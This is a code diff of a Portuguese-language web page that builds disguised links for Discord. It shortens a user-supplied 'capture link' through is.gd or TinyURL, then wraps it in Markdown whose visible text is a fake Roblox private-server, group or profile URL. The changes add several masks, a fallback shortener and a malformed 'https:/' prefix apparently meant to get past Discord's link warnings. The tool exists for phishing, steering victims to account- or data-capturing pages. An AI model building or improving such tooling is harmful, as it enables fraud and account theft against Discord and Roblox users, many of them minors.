@@ -31,10 +31,10 @@
         input { width: 100%; background: #0d1117; border: 1px solid #30363d; border-radius: 10px; padding: 16px; color: white; margin-bottom: 15px; outline: none; font-size: 0.9rem; text-align: center; }
         
         .gen-btn { width: 100%; padding: 16px; background: var(--accent-blue); color: #000; border: none; border-radius: 10px; font-weight: 900; cursor: pointer; text-transform: uppercase; transition: 0.2s; }
-        .gen-btn:hover { filter: brightness(1.2); }
+        .gen-btn:disabled { background: #333; color: #777; cursor: not-allowed; }
 
         .result-box { margin-top: 25px; display: none; animation: slideUp 0.4s ease; }
-        .code-display { background: #000; border: 1px solid #333; padding: 18px; border-radius: 10px; color: #00ff00; font-family: 'Consolas', monospace; font-size: 0.85rem; word-break: break-all; margin-bottom: 15px; text-align: center; }
+        .code-display { background: #000; border: 1px solid #333; padding: 18px; border-radius: 10px; color: #00ff00; font-family: 'Consolas', monospace; font-size: 0.85rem; word-break: break-all; margin-bottom: 15px; text-align: left; white-space: pre-wrap; }
         .copy-btn { width: 100%; padding: 14px; background: #fff; color: #000; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
 
         @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
@@ -49,64 +49,103 @@
 
     <div class="main-container">
         <div class="options-grid">
-            <div class="option-card active" onclick="sel(this)"> <i class="fas fa-globe"></i> <br> All Site </div>
-            <div class="option-card" onclick="sel(this)"> <i class="fas fa-lock"></i> <br> Private </div>
-            <div class="option-card" onclick="sel(this)"> <i class="fas fa-users"></i> <br> Group </div>
-            <div class="option-card" onclick="sel(this)"> <i class="fas fa-user-circle"></i> <br> Profile </div>
+            <div class="option-card active" data-type="all" onclick="sel(this)"> <i class="fas fa-globe"></i> <br> All Site </div>
+            <div class="option-card" data-type="private" onclick="sel(this)"> <i class="fas fa-lock"></i> <br> Private </div>
+            <div class="option-card" data-type="group" onclick="sel(this)"> <i class="fas fa-users"></i> <br> Group </div>
+            <div class="option-card" data-type="profile" onclick="sel(this)"> <i class="fas fa-user-circle"></i> <br> Profile </div>
         </div>
 
         <div class="input-group">
-            <input type="text" id="url-in" placeholder="Cole seu link aqui...">
-            <button class="gen-btn" id="main-btn" onclick="build()">GERAR LINK CAMUFLADO</button>
+            <input type="text" id="url-in" placeholder="Cole seu link de captura aqui...">
+            <button class="gen-btn" id="main-btn" onclick="build()">GERAR LINKS CAMUFLADOS</button>
         </div>
 
         <div class="result-box" id="res">
-            <p style="color: var(--accent-blue); font-size: 0.8rem; margin-bottom: 10px; text-align: center; font-weight: bold;">USE ESTE LINK NO DISCORD:</p>
+            <p style="color: var(--accent-blue); font-size: 0.8rem; margin-bottom: 10px; text-align: center; font-weight: bold;">USE ESTES LINKS NO DISCORD:</p>
             <div class="code-display" id="out"></div>
-            <button class="copy-btn" onclick="clip()">COPIAR AGORA</button>
+            <button class="copy-btn" onclick="clip()">COPIAR TUDO</button>
         </div>
     </div>
 
     <script>
+        let selectedType = 'all';
+
         function sel(e) { 
             document.querySelectorAll('.option-card').forEach(c=>c.classList.remove('active')); 
             e.classList.add('active'); 
+            selectedType = e.getAttribute('data-type');
         }
 
-        function build() {
+        async function shortenPrimary(url) {
+            return new Promise((resolve) => {
+                const callbackName = 'cb_' + Math.floor(Math.random() * 1000000);
+                const script = document.createElement('script');
+                const timeout = setTimeout(() => { resolve(null); }, 5000);
+
+                window[callbackName] = (data) => {
+                    clearTimeout(timeout);
+                    resolve(data.shorturl || null);
+                    delete window[callbackName];
+                    document.body.removeChild(script);
+                };
+                script.src = `https://is.gd/create.php?format=json&callback=${callbackName}&url=${encodeURIComponent(url)}`;
+                document.body.appendChild(script);
+            });
+        }
+
+        async function shortenBackup(url) {
+            try {
+                const res = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(url)}`);
+                if (res.ok) return await res.text();
+            } catch { return null; }
+            return null;
+        }
+
+        async function build() {
             const val = document.getElementById('url-in').value.trim();
             if(!val) return alert("Insira o link primeiro!");
             
             const btn = document.getElementById('main-btn');
+            const outBox = document.getElementById('out');
+            const resDiv = document.getElementById('res');
+
             btn.innerText = "BYPASSING...";
-            
-            // Método JSONP para Is.gd - Resolve o erro de conexão (CORS) das suas fotos
-            const script = document.createElement('script');
-            const callbackName = 'callback_' + Math.round(100000 * Math.random());
-            
-            window[callbackName] = function(data) {
-                if(data.shorturl) {
-                    const robloxMask = "https:/www.roblox.com/share?code=1f9c510c988d284fa0f84f3f9d2a998a&type=Server";
-                    const finalStr = `[${robloxMask}](${data.shorturl})`;
-                    
-                    document.getElementById('out').innerText = finalStr;
-                    document.getElementById('res').style.display = "block";
-                } else {
-                    alert("Erro ao encurtar. Domínio bloqueado ou link inválido.");
-                }
-                btn.innerText = "GERAR LINK CAMUFLADO";
-                delete window[callbackName];
-                document.body.removeChild(script);
+            btn.disabled = true;
+            resDiv.style.display = "none";
+
+            // Máscaras atualizadas com apenas UMA barra após o https:
+            const masks = {
+                profile: "https:/www.roblox.com/users/10469270667/profile",
+                group: "https:/www.roblox.com/communities/35892415/vuvies#!/about",
+                private: "https:/www.roblox.com/share?code=4f0318a03224bb4fae86f53b1afc2b55&type=Server"
             };
 
-            script.src = `https://is.gd/create.php?format=json&callback=${callbackName}&url=${encodeURIComponent(val)}`;
-            document.body.appendChild(script);
+            let shortUrl = await shortenPrimary(val);
+            if (!shortUrl) {
+                shortUrl = await shortenBackup(val);
+            }
+
+            if (shortUrl) {
+                let finalOutput = "";
+                if (selectedType === 'all') {
+                    finalOutput = `[${masks.private}](${shortUrl})\n\n[${masks.group}](${shortUrl})\n\n[${masks.profile}](${shortUrl})`;
+                } else {
+                    finalOutput = `[${masks[selectedType]}](${shortUrl})`;
+                }
+                outBox.innerText = finalOutput;
+                resDiv.style.display = "block";
+            } else {
+                alert("Erro: O link foi bloqueado pelos encurtadores. Tente usar uma URL diferente.");
+            }
+
+            btn.innerText = "GERAR LINKS CAMUFLADOS";
+            btn.disabled = false;
         }
 
         function clip() {
             const t = document.getElementById('out').innerText;
             navigator.clipboard.writeText(t);
-            alert("Link copiado com sucesso!");
+            alert("Links copiados!");
         }
     </script>
 </body>
